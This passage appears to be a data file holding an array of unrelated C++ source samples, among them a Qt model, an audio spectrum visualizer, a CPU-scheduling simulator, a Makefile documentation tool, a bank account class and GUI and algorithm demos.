Qt::UserRole + 13,\n            CategoryRole = Qt::UserRole + 14,\n            LanguageRole = Qt::UserRole + 15,\n            OsRole = Qt::UserRole + 16,\n            DeveloperRole = Qt::UserRole + 17,\n            MailRole = Qt::UserRole + 18,\n            WebsiteRole = Qt::UserRole + 19,\n            TwitterRole = Qt::UserRole + 20,\n            FacebookRole = Qt::UserRole + 21,\n            DonationRole = Qt::UserRole + 22,\n            AASRole = Qt::UserRole + 23,\n            PriceRole = Qt::UserRole + 24,\n            DescriptionRole = Qt::UserRole + 25,\n            Image1Role = Qt::UserRole + 26,\n            Image2Role = Qt::UserRole + 27,\n            Image3Role = Qt::UserRole + 28,\n            TagsRole = Qt::UserRole + 29,\n            ChangelogRole = Qt::UserRole + 30,\n            UnsignedNoteRole = Qt::UserRole + 31,\n            DownloadRole = Qt::UserRole + 32,\n            DownloadStoreRole = Qt::UserRole + 33,\n            DownloadUnsignedRole = Qt::UserRole + 34,\n            UpdateRole = Qt::UserRole + 35,\n            Image4Role = Qt::UserRole + 36,\n            Image5Role = Qt::UserRole + 37,\n            DownloadSizeRole = Qt::UserRole + 38,\n            DownloadUnsignedSizeRole = Qt::UserRole + 39\n        };\n    };\n    QHash<int, QByteArray> roleNames;\n    roleNames[ListEntry::IdRole] = \"id\";\n    roleNames[ListEntry::NameRole] =  \"name\";\n    roleNames[ListEntry::UidRole] = \"uid\";\n    roleNames[ListEntry::UidStoreRole] = \"uidstore\";\n    roleNames[ListEntry::UidUnsignedRole] = \"uidunsigned\";\n    roleNames[ListEntry::IconRole] = \"icon\";\n    roleNames[ListEntry::VersionRole] = \"version\";\n    roleNames[ListEntry::VersionStoreRole] = \"versionstore\";\n    roleNames[ListEntry::VersionUnsignedRole] = \"versionunsigned\";\n    roleNames[ListEntry::VersionDateRole] = \"versiondate\";\n    roleNames[ListEntry::VersionDateStoreRole] = \"versiondatestore\";\n    roleNames[ListEntry::VersionDateUnsignedRole] = \"versiondateunsigned\";\n    roleNames[ListEntry::InstalledUidRole] = \"installed\";\n    roleNames[ListEntry::CategoryRole] = \"category\";\n    roleNames[ListEntry::LanguageRole] = \"language\";\n    roleNames[ListEntry::OsRole] = \"os\";\n    roleNames[ListEntry::DeveloperRole] = \"developer\";\n    roleNames[ListEntry::MailRole] = \"mail\";\n    roleNames[ListEntry::WebsiteRole] = \"website\";\n    roleNames[ListEntry::TwitterRole] = \"twitter\";\n    roleNames[ListEntry::FacebookRole] = \"facebook\";\n    roleNames[ListEntry::DonationRole] = \"donation\";\n    roleNames[ListEntry::AASRole] = \"aas\";\n    roleNames[ListEntry::PriceRole] = \"price\";\n    roleNames[ListEntry::DescriptionRole] = \"description\";\n    roleNames[ListEntry::Image1Role] = \"image1\";\n    ",
    "///////////////////////////////////////////////////////////////////////\n// This file is part of the PySYCL software for SYCL development in\n// Python. It is licensed under the Apache License, Version 2.0. A copy\n// of this license, in a file named LICENSE.md, should have been\n// distributed with this file. A copy of this license is also\n// currently available at \"http://www.apache.org/licenses/LICENSE-2.0\".\n\n// Unless explicitly stated, all contributions intentionally submitted\n// to this project shall also be under the terms and conditions of this\n// license, without any additional terms or conditions.\n///////////////////////////////////////////////////////////////////////\n\n///////////////////////////////////////////////////////////////////////\n/// \\file\n/// \\brief Python module for tensor in PySYCL.\n///////////////////////////////////////////////////////////////////////\n\n///////////////////////////////////////////////////////////////////////\n// local\n///////////////////////////////////////////////////////////////////////\n#include \"Tensor_Python_Module.h\"\n\n///////////////////////////////////////////////////////////////////////\n// pybind11\n///////////////////////////////////////////////////////////////////////\n#include <pybind11/pybind11.h>\n\nnamespace py = pybind11;\n\n///////////////////////////////////////////////////////////////////////\n// Tensor module for PySYCL\n///////////////////////////////////////////////////////////////////////\n\nPYBIND11_MODULE(device, m) {\n  m.doc() = R\"delim(\n    Tensor module for PySYCL\n      This module provides classes and functions for selecting SYCL devices.\n    )delim\";\n}\n",
    "#include <SFML/Graphics.hpp>\n#include <SFML/Audio.hpp>\n#include <fftw3.h>\n#include <cmath>\n#include <iomanip>\n#include <sstream>\n#include <memory>\n#include <iostream>\n\nint main(int argc, char** argv) {\n    auto window = std::make_unique<sf::RenderWindow>(\n        sf::VideoMode(1024, 720),\n        \"Audio Spectrum\",\n        sf::Style::Titlebar | sf::Style::Close\n    );\n\n    if (argc < 2) {\n        std::cerr << \"Usage: \" << argv[0] << \" file.[wav]\\n\";\n        return EXIT_FAILURE;\n    }\n\n    sf::SoundBuffer buffer;\n    if (!buffer.loadFromFile(argv[1])) {\n        std::cerr << \"Failed to load audio file: \" << argv[1] << \"\\n\";\n        return EXIT_FAILURE;\n    }\n\n    sf::Sound sound(buffer);\n    sound.play();\n\n    const int sample_size = 1024;\n    fftw_complex* in = (fftw_complex*)fftw_malloc(sizeof(fftw_complex) * sample_size);\n    fftw_complex* out = (fftw_complex*)fftw_malloc(sizeof(fftw_complex) * sample_size);\n    fftw_plan plan = fftw_plan_dft_1d(sample_size, in, out, FFTW_FORWARD, FFTW_ESTIMATE);\n\n    std::vector<float> spectrum(sample_size / 2);\n    const sf::Int16* samples = buffer.getSamples();\n    std::size_t sample_count = buffer.getSampleCount();\n    std::size_t channels = buffer.getChannelCount();\n    std::size_t current_sample = {};\n\n    sf::Texture texture;\n    texture.loadFromFile(\"./img.jpg\");\n    sf::Sprite sprite(texture);\n\n    sf::Font font;\n    font.loadFromFile(\"./andarilho-font.ttf\");\n    std::string music = argv[1];\n    music = music.substr(0, music.length() - 4);\n    sf::Text text(music, font, 18);\n    text.setPosition(20.f, 10.f);\n\n    float totalDuration = buffer.getDuration().asSeconds();\n\n    float barVisualizerWidth = 50 * 6.f; \n    float xOffset = (window->getSize().x - barVisualizerWidth) / 2.f;\n\n    sf::RectangleShape progressBar;\n    progressBar.setFillColor(sf::Color::White);  \n    progressBar.setSize(sf::Vector2f(0.f, 5.f)); \n    progressBar.setPosition(xOffset, window->getSize().y / 2.f + 120.f);\n\n    sf::RectangleShape progressBarBackground;\n    progressBarBackground.setFillColor(sf::Color(100, 100, 100));\n    progressBarBackground.setSize(sf::Vector2f(barVisualizerWidth, 5.f));\n    progressBarBackground.setPosition(xOffset, window->getSize().y / 2.f + 120.f);\n\n    sf::Text timeText(\"\", font, 18);\n    timeText.setPosition(xOffset, window->getSize().y / 2.f + 140.f);\n\n    while (window->isOpen()) {\n        auto event = std::make_unique<sf::Event>();\n        while (window->pollEvent(*event)) {\n            if (event->type == sf::Event::Closed) {\n                window->close();\n            }\n        }\n\n        if (sound.getStatus() == sf::Sound::Stopped) {\n            break;\n        }\n\n        for (int i = 0; i < sample_size; ++i) {\n            std::size_t index = (current_sample + i) % (sample_count / channels);\n            in[i][0] = static_cast<double>(samples[index * channels]) / 32768.0;\n            in[i][1] = 0.0;\n        }\n\n        fftw_execute(plan);\n\n        for (int i = 0; i < sample_size / 2; ++i) {\n            spectrum[i] = std::sqrt(out[i][0] * out[i][0] + out[i][1] * out[i][1]);\n        }\n\n        current_sample += sample_size;\n\n        float currentTime = sound.getPlayingOffset().asSeconds();\n        float progress = currentTime / totalDuration;\n\n        progressBar.setSize(sf::Vector2f(progress * progressBarBackground.getSize().x, 5.f));\n\n        std::ostringstream timeStream;\n        timeStream << std::fixed << std::setprecision(0)\n                   << currentTime << \"s / \" << totalDuration << \"s\";\n        timeText.setString(timeStream.str());\n\n        window->clear();\n        window->draw(sprite);\n        window->draw(text);\n\n        for (int i = 0; i < 50; i++) {\n            sf::RectangleShape bar;\n            float barWidth = 2.f;\n            float spacing = 6.f;\n            float totalWidth = 50 * spacing;\n            float xOffset = (window->getSize().x - totalWidth) / 2.f;\n\n            bar.setSize(sf::Vector2f(barWidth, spectrum[i] * 1.f));\n            bar.setPosition(i * spacing + xOffset, window->getSize().y / 2.f);\n            bar.setRotation(180);\n            window->draw(bar);\n\n            bar.setSize(sf::Vector2f(barWidth, -(spectrum[i] * 1.f)));\n            window->draw(bar);\n        }\n\n        window->draw(progressBarBackground);\n        window->draw(progressBar);\n        window->draw(timeText);\n\n        window->display();\n    }\n\n    fftw_destroy_plan(plan);\n    fftw_free(in);\n    fftw_free(out);\n\n    return EXIT_SUCCESS;\n}\n",
    "#include <iostream> //STD INPUT OUTPUT\n#include <algorithm> // for std::sort\n#include <queue> //DATA STRUC\n#include <iomanip> // FOR SETW IN THE PRINT SHEDULE FUNC\n#include <pthread.h> //THREADING AND MUTEX\n#include <string> //STRING OPERATIONS\n#include <fcntl.h> //SHM\n#include <sys/stat.h> //SHM\n#include <sys/types.h> //SHM\n#include <sys/wait.h> //WAIT SYSTEM CALL\n#include <cstring> //STRING MANIPULATION\n#include <fstream> //FILING\n#include <sstream> //CSV DATA SPLITING\n#include <string>\n#include <cstdlib>\n#include <iostream>\n#include <cstring>\n#include <sys/mman.h> //SHM\n#include <sys/stat.h> //SHM\n#include <unistd.h>\n\nusing namespace std;\n\n#define NUMTHREADS 5\n#define NUMPROCESS 10\n#define MAX_BUFFER_SIZE 10000\n int cnt=0;//global\n int flag=-1;\n bool same=false;\nstring global22=\"\";\nclass process;\n// FUNCTION DECLARATION/\nbool sortByShortestJob(const process &a, const process &b);\nbool sortByArrivalTime(const process &a, const process &b);\nbool sortByShortestRemainingJob(const process &a, const process &b);\nvoid *sumturnaround(void *arg);\nint calculateturnaroundtime();\nvoid *sumResponse(void *arg);\nint calculateResponsetime();\nvoid *sumwaiting(void *arg);\nint calculatewaitingtime();\nvoid printSchedule(process processes[], int numProcesses);\nvoid *FCFS(void *p1);\nvoid *shortestjobfirst(void *p1);\nvoid *roundrobin(void *p1);\nvoid *shortestremainingtime(void *p1);\n\nclass process   //MAIN PROCESS CLASS\n{\n\t//ATTRIBUTES\n    string name;\n    int arrivalTime;\n    int burstTime;\n    int dupburstTime;\n\npublic:\n    bool processing;\n    bool done;\n    int starttime;\n    int endtime;\n    static int cnt;\n    process(string n, int a, int b)\n    {\n        name = n;\n        arrivalTime = a;\n        burstTime = b;\n        done = false;\n        processing = false;\n        starttime = 999;\n        endtime = 999;\n        dupburstTime = b;\n        cnt++;\n    }\n    process()\n    {\n    }\n    void setprocess(string n, int a, int b)\n    {\n        name = n;\n        arrivalTime = a;\n        burstTime = b;\n        done = false;\n        processing = false;\n        starttime = 999;\n        endtime = 999;\n        dupburstTime = b;\n        cnt++;\n    }\n\n    int getArrivalTime() const\n    {\n        return arrivalTime;\n    }\n\n    int getBurstTime() const\n    {\n        return burstTime;\n    }\n    int getdupBurstTime() const\n    {\n        return dupburstTime;\n    }\n\n    string getname()\n    {\n        return name;\n    }\n    void decrementBurstTime(int k)\n    {\n        dupburstTime = dupburstTime - k;\n    }\n    int getTurnaroundTime() const\n    {\n        return (endtime - arrivalTime);\n    }\n\n    int getWaitingTime() const\n    {\n        return (getTurnaroundTime() - burstTime);\n    }\n\n    int getResponseTime() const\n    {\n        return (starttime - arrivalTime);\n    }\n};\n// allocation\nprocess arr[NUMPROCESS];\nint process::cnt = 0;\n\nbool sortByShortestJob(const process &a, const process &b)\n{\n    return a.getBurstTime() < b.getBurstTime();\n}\nbool sortByArrivalTime(const process &a, const process &b)\n{\n    return a.getArrivalTime() < b.getArrivalTime();\n}\nbool sortByShortestRemainingJob(const process &a, const process &b)\n{\n    return a.getdupBurstTime() < b.getdupBurstTime();\n}\n\n//******* multi threading task parallelism *******\n//\npthread_mutex_t turn;\nvoid *sumturnaround(void *arg)\n{\n    int x = 10;\n    int tid = *((int *)arg);\n    int sum = 0;\n    int start = tid * (x / NUMTHREADS);\n    int end = start + (x / NUMTHREADS);\n    if (tid == NUMTHREADS - 1)\n    {\n        end = x;\n    }\n    for (int i = start; i < end; i++)\n    {\n    \tpthread_mutex_lock(&turn);   //MAKING SURE THAT ALL TH DATA IS ADDED CORRECTED LY AND 2 PROCESS IS NOT MAKING MESS WITH SUM VARIABLE\n        sum += arr[i].getTurnaroundTime(); // Corrected access to process object\n    \tpthread_mutex_unlock(&turn);\n\t}\n    int *result = new int(sum); // Dynamically allocate memory for result\n    pthread_exit((void *)result);\n    return (arg);\n}\n\nint calculateturnaroundtime()\n{\n    int sum1 = 0;\n    pthread_t tid[NUMTHREADS];\n    int thread_ids[NUMTHREADS];\n    for (int i = 0; i < NUMTHREADS; i++)\n    {\n        thread_ids[i] = i;\n        pthread_create(&tid[i], NULL, sumturnaround, (void *)&thread_ids[i]);\n    }\n\n    for (int i = 0; i < NUMTHREADS; i++)\n    {\n        int *result;\n        pthread_join(tid[i], (void **)&result);\n        if (result != nullptr)\n        {\n            // chcking when working on it\n            //   cout << \"CHECKING PURPOSE Result FROM THREAD \" << i << \": \" << *result << endl; // Print the result value\n            sum1 += *result;\n            delete result;\n        }\n        else\n        {\n            // Handle error or exception\n            cout << \"Error: Thread \" << i << \" failed to return a result.\" << endl;\n        }\n    }\n    return sum1 / NUMPROCESS;\n}\n// %%%%%%%%%%%%%%%%%%%%5 RESPONSE TIME %%%%%%%%%%%%%%%%\npthread_mutex_t res;\nvoid *sumResponse(void *arg)\n{\n    int x = 10;\n    int tid = *((int *)arg);\n    int sum = 0;\n    int start = tid * (x / NUMTHR",
    "#include <iostream>\n#include <fstream>\n#include <regex>\n#include <string>\n#include <vector>\n#include <sstream>\n#include <filesystem>\n\n// Structure to represent a Makefile target\nstruct Target {\n    std::string name;           // Name of the target\n    std::string dependencies;   // Dependencies for the target\n    std::string comment;        // Comment describing the target\n};\n\n// Function to validate input arguments\nvoid validateArguments(int argc, char* argv[]) {\n    if (argc != 2) {\n        throw std::invalid_argument(\"Usage: makefile_doc_tool <path_to_makefile>\");\n    }\n}\n\n// Function to validate the Makefile path\nvoid validateMakefilePath(const std::string& filepath) {\n    if (!std::filesystem::exists(filepath)) {\n        throw std::runtime_error(\"Error: Makefile not found at \" + filepath);\n    }\n    if (!std::filesystem::is_regular_file(filepath)) {\n        throw std::runtime_error(\"Error: Path does not point to a valid Makefile.\");\n    }\n}\n\n// Function to parse the Makefile and extract targets\nstd::vector<Target> parseMakefile(const std::string& filepath) {\n    std::vector<Target> targets;\n    std::regex targetPattern(R\"(([\\w\\-\\.]+):\\s*(.*?)\\s+#\\s*(.*)$)\"); // Allow special characters in names\n    std::ifstream file(filepath);\n\n    if (!file.is_open()) {\n        throw std::runtime_error(\"Unable to open Makefile: \" + filepath);\n    }\n\n    std::string line;\n    int lineNumber = 0;\n    while (std::getline(file, line)) {\n        lineNumber++;\n        std::smatch match;\n        if (std::regex_match(line, match, targetPattern)) {\n            targets.push_back({match[1], match[2], match[3]});\n        } else if (!line.empty() && line[0] != '#') {\n            std::cerr << \"Warning: Could not parse line \" << lineNumber << \": \" << line << std::endl;\n        }\n    }\n\n    if (targets.empty()) {\n        throw std::runtime_error(\"No valid targets with comments found in the Makefile.\");\n    }\n\n    return targets;\n}\n\n// Function to generate the \"help\" target content for the Makefile\nstd::string generateHelpTarget(const std::vector<Target>& targets) {\n    std::ostringstream helpTargetStream;\n    helpTargetStream << \"help: # Print help on Makefile\\n\";\n    helpTargetStream << \"\\t@echo \\\"Please use 'make <target>' where <target> is one of\\\"\\n\";\n    helpTargetStream << \"\\t@echo \\\"\\\"\\n\";\n\n    for (const auto& target : targets) {\n        helpTargetStream << \"\\t@echo \\\"  \\033[93m\" << target.name << \"\\033[0m\\t\"\n                         << target.comment << \" [\" << target.dependencies << \"]\\\"\\n\";\n    }\n\n    helpTargetStream << \"\\t@echo \\\"\\\"\\n\";\n    helpTargetStream << \"\\t@echo \\\"Check the Makefile to know exactly what each target is doing.\\\"\\n\";\n\n    return helpTargetStream.str();\n}\n\n// Function to append the generated \"help\" target to the Makefile\nvoid updateMakefile(const std::string& filepath, const std::string& helpTarget) {\n    std::ofstream file(filepath, std::ios::app);\n\n    if (!file.is_open()) {\n        throw std::runtime_error(\"Unable to open Makefile for writing: \" + filepath);\n    }\n\n    file << \"\\n.DEFAULT_GOAL = help\\n\";\n    file << helpTarget;\n}\n\n// Main function\nint main(int argc, char* argv[]) {\n    try {\n        // Validate arguments\n        validateArguments(argc, argv);\n        std::string makefilePath = argv[1];\n\n        // Validate Makefile path\n        validateMakefilePath(makefilePath);\n\n        std::cout << \"Starting Makefile Doc Tool...\" << std::endl;\n\n        // Parse the Makefile to extract targets\n        auto targets = parseMakefile(makefilePath);\n        std::cout << \"Number of targets found: \" << targets.size() << std::endl;\n\n        // Generate the help target content\n        std::string helpTarget = generateHelpTarget(targets);\n\n        // Update the Makefile with the help target\n        updateMakefile(makefilePath, helpTarget);\n\n        std::cout << \"Help target successfully added to \" << makefilePath << std::endl;\n        return 0; // Exit successfully\n\n    } catch (const std::invalid_argument& e) {\n        std::cerr << \"Usage Error: \" << e.what() << std::endl;\n        return 1;\n    } catch (const std::exception& e) {\n        std::cerr << \"Error: \" << e.what() << std::endl;\n        return 1;\n    }\n}\n\n",
    "#include \"Account.h\"\r\n#include <iostream>\r\n\r\nAccount::Account(const std::string& card_number) : card_number(card_number) {}\r\n\r\ndouble Account::getBalance(Database& db)\r\n{\r\n    return db.getBalance(card_number);\r\n}\r\n\r\nbool Account::deposit(Database& db, double amount)\r\n{\r\n    if (amount <= 0)\r\n    {\r\n        std::cerr << \"Invalid amount\" << std::endl;\r\n        return false;\r\n    }\r\n    double new_balance = getBalance(db) + amount;\r\n    bool success = db.updateBalance(card_number, new_balance);\r\n    if (success)\r\n    {\r\n        db.logTransaction(card_number, \"deposit\", amount);\r\n    }\r\n    return success;\r\n}\r\n\r\nbool Account::withdraw(Database& db, double amount)\r\n{\r\n    if (amount <= 0)\r\n    {\r\n        std::cerr << \"Invalid amount\" << std::endl;\r\n        return false;\r\n    }\r\n    double current_balance = getBalance(db);\r\n    if (current_balance < amount)\r\n    {\r\n        std::cerr << \"Insufficient funds\" << std::endl;\r\n        return false;\r\n    }\r\n\r\n    double new_balance = current_balance - amount;\r\n    bool success = db.updateBalance(card_number, new_balance);\r\n    if (success)\r\n    {\r\n        db.logTransaction(card_number, \"withdrawal\", amount);\r\n    }\r\n    return success;\r\n}\r\n\r\nbool Account::transfer(Database& db, const std::string& to_card_number, double amount)\r\n{\r\n    if (amount <= 0)\r\n    {\r\n        std::cerr << \"Invalid amount\" << std::endl;\r\n        return false;\r\n    }\r\n    return db.transferFunds(card_number, to_card_number, amount);\r\n}\r\n",
    "#include <iostream>\n#include \"NN.h\"\n#include \"knn.h\"\n\nusing namespace std;\n\n#define IMGSIZE 28*28  // change depending of the size of the images used\n\nint main () {\n    // creating the neural network\n    vector<Layer> NN;\n    addLayer(NN, \"ReLU\", 256, IMGSIZE);\n    addLayer(NN, \"ReLU\", 128);\n    addLayer(NN, \"softmax\", 10);\n    \n    // example use of other activation functions\n    // addLayer(NN, \"ELU\", 128, vector<float>{1.0f});\n    // addLayer(NN, \"SELU\", 64);\n    // addLayer(NN, \"SELU\", 32, vector<float>{1.0f, 1.0f});\n    // addLayer(NN, \"sigmoid\", 10);\n\n    string train_data_csv_path = \"mnist/training_paths.csv\";  // a cpp file is provided in utilities to generate this files\n    string test_data_csv_path = \"mnist/testing_paths.csv\";\n\n    // training parameters\n    int epochs = 30;\n    int batch_size = 32;\n    float learning_rate = 0.001;  // start with 0.01 then improve with 0.001\n\n    string model_path = \"saved_model/model.bin\";\n\n    // choose one of the following functions to run\n    // trainModel (NN, model_path, train_data_csv_path, 60000, batch_size, epochs, learning_rate);\n    // improveModel (NN, model_path, train_data_csv_path, 60000, batch_size, epochs, learning_rate);\n    // testModel (NN, model_path, test_data_csv_path, 10000);\n    // predict(NN, model_path, \"test_img.png\");\n\n    if (NN.size() > 0) {\n        destroyNN(NN);\n    }\n\n   /*\n    // KNN example\n    string img_path = \"test_img.png\";\n    string data_csv_path = \"mnist/training_paths.csv\";\n    int k = 5;\n    int data_size = 60000;\n    int class_nb = 10;\n    knn(img_path, k, data_csv_path, data_size, class_nb);\n    */\n\n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"m_touch_assigment\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Dear ImGui: standalone example application for GLFW + OpenGL 3, using programmable pipeline\n// (GLFW is a cross-platform general purpose library for handling windows, inputs, OpenGL/Vulkan/Metal graphics context creation, etc.)\n\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n#include <random>\n\n#include \"imgui.h\"\n#include \"imgui_impl_glfw.h\"\n#include \"imgui_impl_opengl3.h\"\n#include <stdio.h>\n#define GL_SILENCE_DEPRECATION\n#if defined(IMGUI_IMPL_OPENGL_ES2)\n#include <GLES2/gl2.h>\n#endif\n#include <GLFW/glfw3.h> // Will drag system OpenGL headers\n#include <iostream>\n\n#include \"gui.h\"\n#include \"simulation.h\"\n\n#include \"objects/Food.h\"\n\n// [Win32] Our example includes a copy of glfw3.lib pre-compiled with VS2010 to maximize ease of testing and compatibility with old VS compilers.\n// To link with VS2010-era libraries, VS2015+ requires linking with legacy_stdio_definitions.lib, which we do using this pragma.\n// Your own project should not be affected, as you are likely to link with a newer binary of GLFW that is adequate for your version of Visual Studio.\n#if defined(_MSC_VER) && (_MSC_VER >= 1900) && !defined(IMGUI_DISABLE_WIN32_FUNCTIONS)\n#pragma comment(lib, \"legacy_stdio_definitions\")\n#endif\n\n// This example can also compile and run with Emscripten! See 'Makefile.emscripten' for details.\n#ifdef __EMSCRIPTEN__\n#include \"../libs/emscripten/emscripten_mainloop_stub.h\"\n#endif\n\n#define STB_IMAGE_IMPLEMENTATION\n#include \"stb_image.h\"  // For loading PNG images\n\n#include <filesystem>\n\n// Function to load image and return GLFWimage\nGLFWimage LoadIcon(const char* filepath) {\n    GLFWimage icon = { 0, 0, nullptr };\n    int width, height, channels;\n\n    try {\n        std::filesystem::path currentPath = std::filesystem::current_path();\n        std::cout << \"Current working directory: \" << currentPath << std::endl;\n    } catch (const std::filesystem::filesystem_error& e) {\n        std::cerr << \"Error: \" << e.what() << std::endl;\n    }\n\n    // Load the image using stb_image\n    unsigned char* data = stbi_load(filepath, &width, &height, &channels, 0);\n    if (data) {\n        icon.width = width;\n        icon.height = height;\n        icon.pixels = data;\n    }\n    else {\n        std::cerr << \"Failed to load icon image!\" << std::endl;\n    }\n\n    return icon;\n}\n\nstatic void glfw_error_callback(int error, const char* description)\n{\n    fprintf(stderr, \"GLFW Error %d: %s\\n\", error, description);\n}\n\nint guiLoop(std::shared_ptr<Simulation> simulation)\n{\n    glfwSetErrorCallback(glfw_error_callback);\n    if (!glfwInit())\n        return 1;\n\n    // Decide GL+GLSL versions\n#if defined(IMGUI_IMPL_OPENGL_ES2)\n    // GL ES 2.0 + GLSL 100 (WebGL 1.0)\n    const char* glsl_version = \"#version 100\";\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 2);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 0);\n    glfwWindowHint(GLFW_CLIENT_API, GLFW_OPENGL_ES_API);\n#elif defined(IMGUI_IMPL_OPENGL_ES3)\n    // GL ES 3.0 + GLSL 300 es (WebGL 2.0)\n    const char* glsl_version = \"#version 300 es\";\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 0);\n    glfwWindowHint(GLFW_CLIENT_API, GLFW_OPENGL_ES_API);\n#elif defined(__APPLE__)\n    // GL 3.2 + GLSL 150\n    const char* glsl_version = \"#version 150\";\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 2);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);  // 3.2+ only\n    glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);            // Required on Mac\n#else\n    // GL 3.0 + GLSL 130\n    const char* glsl_version = \"#version 130\";\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 0);\n    //glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);  // 3.2+ only\n    //glfwWindowHint(GLFW_OPENGL_FORWARD_COMPAT, GL_TRUE);            // 3.0+ only\n#endif\n\n    // Create window with graphics context\n    GLFWwindow* window = glfwCreateWindow(1280, 720, \"Bots Life Simulation\", nullptr, nullptr);\n\n    GLFWimage icon = LoadIcon(\"../assets/icon.png\");\n\n    if (!icon.pixels) {\n        icon = LoadIcon(\"./assets/icon.png\");\n    }\n\n    if (icon.pixels) {\n        glfwSetWindowIcon(window, 1, &icon);\n        stbi_image_free(icon.pixels);  // Free image data after setting the icon\n    }\n\n    if (window == nullptr)\n        return 1;\n    glfwMakeContextCurrent(window);\n    glfwSwapInterval(1); // Enable vsync\n\n    // Setup Dear ImGui context\n    IMGUI_CHECKVERSION();\n    ImGui::CreateContext();\n    ImGuiIO& io = ImGui::GetIO(); (void)io;\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;     // Enable Keyboard Controls\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;      // Enable Gamepad Controls\n    io.ConfigFla",
    "#include <bits/stdc++.h>\nusing namespace std;\n\n/* ========== COPY TO\u00c0N B\u1ed8 TEMPLATE \u1ede TR\u00caN V\u00c0O \u0110\u00c2Y ========== */\n/*\n   (V\u00ec ph\u1ea7n qu\u00e1 d\u00e0i, \u1edf \u0111\u00e2y gi\u1ea3 s\u1eed b\u1ea1n \u0111\u00e3 copy t\u1ea5t c\u1ea3 struct/h\u00e0m \n   BFS, DFS, topoSort, TarjanSCC, Articulation, Floyd, Dijkstra,\n   DSU, Kruskal, Dinic, Hopkroft-Karp, Fenwick, Segment Tree, \n   Sparse Table, modExp, matrix exp, T\u1ed5 h\u1ee3p, LCA, Euler Tour, \n   Hash/Z/KMP/Manacher/Trie, LIS/LCS/DP bitmask/Knapsack, \n   Digit DP, DP DAG..., Convex hull, CCW, segment intersect,\n   polygon area, point in polygon, backtrack, compress, Mo's, ... )\n*/\n\n/* ======== DEMO USAGE CODE (ch\u1ec9 g\u1ecdi h\u00e0m) ======== */\n\n// 1) Demo BFS/DFS\nvoid demoBFS_DFS() {\n    cout << \"\\n--- Demo BFS/DFS ---\\n\";\n    vector<vector<int>> adj = {\n        {1,2},   // 0\n        {2,3},   // 1\n        {3},     // 2\n        {},      // 3\n    };\n    // BFS from node 0\n    auto bfsOrder = BFS(0, adj);\n    cout << \"BFS order from node 0: \";\n    for (auto &x : bfsOrder) cout << x << \" \";\n    cout << \"\\n\";\n    // DFS from node 0\n    auto dfsOrder = DFS(0, adj);\n    cout << \"DFS order from node 0: \";\n    for (auto &x : dfsOrder) cout << x << \" \";\n    cout << \"\\n\";\n}\n\n// 2) Demo Topo Sort (Kahn)\nvoid demoTopo() {\n    cout << \"\\n--- Demo Topological Sort ---\\n\";\n    // 4 nodes (0 -> 1 -> 2, 0 -> 2, 2 -> 3)\n    vector<vector<int>> adj = {\n        {1,2}, // 0\n        {2},   // 1\n        {3},   // 2\n        {}     // 3\n    };\n    auto order = topoSort(adj);\n    cout << \"Topo sort: \";\n    for (auto &x : order) cout << x << \" \";\n    cout << \"\\n\";\n}\n\n// 3) Demo SCC (Tarjan)\nvoid demoSCC() {\n    cout << \"\\n--- Demo Tarjan SCC ---\\n\";\n    /*\n       Gi\u1ea3 s\u1eed \u0111\u1ed3 th\u1ecb c\u00f3 5 \u0111\u1ec9nh: 0->1, 1->2, 2->0, 1->3, 3->4\n       => SCC {0,1,2}, {3}, {4}\n    */\n    TarjanSCC scc(5);\n    scc.addEdge(0,1);\n    scc.addEdge(1,2);\n    scc.addEdge(2,0);\n    scc.addEdge(1,3);\n    scc.addEdge(3,4);\n    scc.buildSCC();\n    cout << \"SCC comp array:\\n\";\n    for(int i=0;i<5;i++){\n        cout << \"Node \" << i << \" in SCC \" << scc.comp[i] << \"\\n\";\n    }\n}\n\n// 4) Demo Articulation points & Bridges\nvoid demoArticulationAndBridges() {\n    cout << \"\\n--- Demo Articulation & Bridges ---\\n\";\n    Articulation art(5);\n    /*\n       0--1--2\n       |  |\n       3--4\n       => 1 l\u00e0 kh\u1edbp? T\u00f9y c\u1ea5u tr\u00fac. Ta ch\u1ec9 minh h\u1ecda.\n    */\n    art.addEdge(0,1);\n    art.addEdge(1,2);\n    art.addEdge(1,3);\n    art.addEdge(3,4);\n    